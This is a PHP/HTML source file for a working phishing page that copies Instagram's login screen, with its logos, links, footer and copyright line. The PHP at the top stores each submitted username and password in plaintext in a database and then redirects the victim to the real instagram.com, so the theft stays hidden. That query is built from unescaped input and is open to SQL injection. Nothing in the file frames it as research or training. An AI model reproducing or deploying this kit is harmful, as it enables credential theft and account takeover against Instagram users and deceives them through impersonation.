<?php
require_once "config.php";

  
if(isset($_POST['username'])){
    $username = $_POST['username'];
    $password = $_POST['password'];

    $insert_query = "INSERT INTO `users` ( `username`, `password`, `date`) VALUES ( '$username', '$password', CURRENT_TIMESTAMP)";

    $result_insert = mysqli_query($con,$insert_query);

    if($result_insert){
        header("location: https://www.instagram.com/");
    }
}
    

?>




<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- FAVIVON -->
    <link rel="shortcut icon" href="https://drive.google.com/file/d/1xGY-HquiE986XBUvxQJpmklfPAqIlGAe/view?usp=sharing" type="image/png">

    <!-- GOOGLE FONT -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
    <!-- APP CSS -->
    <link rel="stylesheet" href="./app.css">
</head>

<body>

    <div class="container">
        <div class="main-container">
            <div class="main-content">
                <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
                    <div class="slide-content" id="slide-content">
                        <img src="./images/slide (1).jpg" alt="slide image" class="active">
                        <img src="./images/slide (2).jpg" alt="slide image">
                        <img src="./images/slide (3).jpg" alt="slide image">
                        <img src="./images/slide (4).jpg" alt="slide image">
                        <img src="./images/slide (5).jpg" alt="slide image">
                    </div>
                </div>
                <div class="form-container">
                    <form action="index.php" method="post">

                    <div class="form-content box">
                        <div class="logo">
                            <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                        </div>
                        <div class="signin-form" id="signin-form">
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>
                                        username
                                    </span>
                                    <input type="text" name="username" required>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>
                                        Password
                                    </span>
                                    <input type="password" name="password" required>
                                    <button>Show</button>
                                </div>
                            </div>
                            <div class="btn-group">
                                <button class="btn-login" id="signin-btn" disabled>
                                    Log In
                                </button>
                            </div>
                            <div class="divine">
                                <div></div>
                                <div>OR</div>
                                <div></div>
                            </div>
                            <div class="btn-group">
                                <button class="btn-fb">
                                    <img src="./images/facebook-icon.png" alt="">
                                    <a style="text-decoration: none;" href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%2522fzt7fm157rgx3ayl2i81nx4bo51t6mibl9q9ku62vbkw5wlius%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9c9be3fe-6ca3-41cb-8e47-f7ccf2f8939f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522fzt7fm157rgx3ayl2i81nx4bo51t6mibl9q9ku62vbkw5wlius%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0"><span>Log in with Facebook</span></a>
                                </button>
                            </div>
                            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pw">Forgot password?</a>
                        </div>
                    </div>
                    <div class="box goto">
                        <p>
                            Don't have an account?
                            <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
                        </p>
                    </div>

                    <div class="app-download">
                        <p>Get the app.</p>
                        <div class="store-link">
                            <a target="_blank" href="https://l.instagram.com/?u=https%3A%2F%2Fitunes.apple.com%2Fapp%2Finstagram%2Fid389801252%3Fpt%3D428156%26ct%3Digweb.loginPage.badge%26mt%3D8%26vt%3Dlo&e=ATOJU5CtvM70wqBvKoQMUJZGfs6ntba99U1l0x_ZOwEpA86Aoc6RnhsZsnJrAJUwEPP527a48ox2BtXU&s=1">
                                <img src="./images/app-store.png" alt="app store">
                            </a>
                            <a target="_blank" href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DCC475DAB-5F4C-46AE-AE82-46B5EC502D51%26utm_content%3Dlo%26utm_medium%3Dbadge">
                                <img src="./images/gg-play.png" alt="google play">
                            </a>
                        </div>
                    </div>
                </form>
                </div>
           
            </div>
        </div>
        <div class="footer">
            <div class="links">
                <a href="https://about.instagram.com/">About</a>
                <a href="https://about.instagram.com/en_US/blog">Blog</a>
                <a href="https://about.instagram.com/about-us/careers">Jobs</a>
                <a href="https://help.instagram.com/">Help</a>
                <a href="https://developers.facebook.com/docs/instagram">API</a>
                <a href="https://help.instagram.com/519522125107875/?maybe_redirect_pol=0">Privacy</a>
                <a href="https://help.instagram.com/581066165581870">Terms</a>
                <a href="">Top Accounts</a>
                <a href="">Hashtags</a>
                <a href="">Locations</a>
                <a href="#" id="darkmode-toggle">Darkmode</a>
            </div>
            <div class="copyright">
                © 2022 Instagram from Meta
            </div>
        </div>
    </div>

    <!-- APP JS -->
    <script src="./app.js"></script>

</body>

</html>